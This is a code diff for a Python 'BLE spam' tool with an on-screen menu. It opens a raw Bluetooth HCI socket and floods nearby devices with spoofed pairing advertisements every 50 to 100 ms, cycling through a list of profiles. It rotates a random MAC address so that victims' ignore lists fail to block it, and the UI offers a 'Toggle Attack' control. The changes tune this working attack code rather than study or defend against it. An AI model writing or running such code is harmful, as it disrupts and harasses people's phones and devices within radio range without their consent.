@@ -83,53 +83,45 @@ class BLESpamView:
         try:
             # Open raw HCI socket
             sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
-            sock.bind((self.iface_idx,)) # Dynamic interface (0=hci0, 1=hci1)
+            sock.bind((self.iface_idx,)) 
 
-            # 1. Reset Bluetooth controller to a known clean state
-            self._hci_send_cmd(sock, 0x03, 0x0003, b"") # Reset
+            # 1. Disable advertising first
+            self._hci_send_cmd(sock, 0x08, 0x000a, b"\x00")
             time.sleep(0.1)
 
-            # 2. Set Random Address (Spoofing)
-            def set_rand_mac():
-                mac = bytes([random.randint(0, 255) for _ in range(6)])
-                # Must have top two bits set for 'Static Random Address'
-                mac = bytes([mac[0] | 0xC0]) + mac[1:]
-                self._hci_send_cmd(sock, 0x08, 0x0005, mac)
-            
-            set_rand_mac()
-
-            # 3. Set Advertising Parameters
-            # Interval min/max: 0x0020 (20ms) - VERY AGGRESSIVE
-            params = struct.pack("<HHBBB6sBB", 0x0020, 0x0020, 0x00, 0x01, 0x00, b"\x00"*6, 0x07, 0x00)
+            # 2. Set Advertising Parameters
+            # Interval: 0x0020 (20ms), Type: 0x03 (ADV_NONCONN_IND)
+            params = struct.pack("<HHBBB6sBB", 0x0020, 0x0020, 0x03, 0x00, 0x00, b"\x00"*6, 0x07, 0x00)
             self._hci_send_cmd(sock, 0x08, 0x0006, params)
 
             while not self._stop_event.is_set():
-                # Randomize MAC every few seconds to bypass ignore lists
-                if self.packets_sent % 50 == 0:
+                # Randomize MAC every 100 packets
+                if self.packets_sent % 100 == 0:
                     self._hci_send_cmd(sock, 0x08, 0x000a, b"\x00") # Stop
-                    set_rand_mac()
+                    mac = bytes([random.randint(0, 255) for _ in range(6)])
+                    mac = bytes([mac[0] | 0xC0]) + mac[1:] # Static Random
+                    self._hci_send_cmd(sock, 0x08, 0x0005, mac)
                     self._hci_send_cmd(sock, 0x08, 0x000a, b"\x01") # Start
+                    time.sleep(0.1)
 
                 # Select data
                 profile_name, profile_data = PROFILES[self.cursor]
                 if profile_data == b"ALL":
-                    # Cycle through all except the "ALL" entry itself
                     actual_profiles = [p for p in PROFILES if p[1] != b"ALL"]
                     profile_data = random.choice(actual_profiles)[1]
 
-                # 4. Set Advertising Data (Aggressive update)
-                # Length byte + data + padding to 31 bytes
+                # 3. Set Advertising Data
                 cmd_data = bytes([len(profile_data)]) + profile_data.ljust(31, b"\x00")
                 self._hci_send_cmd(sock, 0x08, 0x0008, cmd_data)
                 
-                # Ensure it's started
+                # Ensure it's active
                 self._hci_send_cmd(sock, 0x08, 0x000a, b"\x01")
                 
                 self.packets_sent += 1
-                time.sleep(0.1)
+                time.sleep(0.05)
 
             # Cleanup
-            self._hci_send_cmd(sock, 0x08, 0x000a, b"\x00") # Stop
+            self._hci_send_cmd(sock, 0x08, 0x000a, b"\x00")
             sock.close()
 
         except Exception as e:
@@ -138,7 +130,6 @@ class BLESpamView:
 
     def _hci_send_cmd(self, sock: socket.socket, ogf: int, ocf: int, data: bytes):
         opcode = (ogf << 10) | ocf
-        # 0x01 = HCI Command Packet
         packet = struct.pack("<BHB", 0x01, opcode, len(data)) + data
         sock.send(packet)
 
@@ -161,7 +152,7 @@ class BLESpamView:
             e_surf = self.body_font.render(self.error_msg, True, theme.ERR)
             surf.blit(e_surf, (theme.PADDING, 90))
 
-        # Visual indicator (scanner-like line)
+        # Visual indicator
         if self.running:
             scan_x = (int(time.time() * 400) % (theme.SCREEN_W - 40)) + 20
             pygame.draw.line(surf, theme.ACCENT, (scan_x, 100), (scan_x, 110), 4)
@@ -179,10 +170,5 @@ class BLESpamView:
             p_surf = self.body_font.render(f"[{'*' if self.running and i == self.cursor else ' '}] {name}", True, color)
             surf.blit(p_surf, (theme.PADDING + 10, y))
 
-        if self.running:
-            msg = "Broadcasting spoofed pairing packets..."
-            m_surf = self.body_font.render(msg, True, theme.FG)
-            surf.blit(m_surf, (theme.PADDING, theme.SCREEN_H - 80))
-
-        hint = self.body_font.render("A: Toggle Attack  X: Cycle Iface  UP/DN: Select  B: Back", True, theme.FG_DIM)
+        hint = self.body_font.render("A: Toggle Attack  X: Cycle Iface  B: Back", True, theme.FG_DIM)
         surf.blit(hint, (theme.PADDING, theme.SCREEN_H - 30))
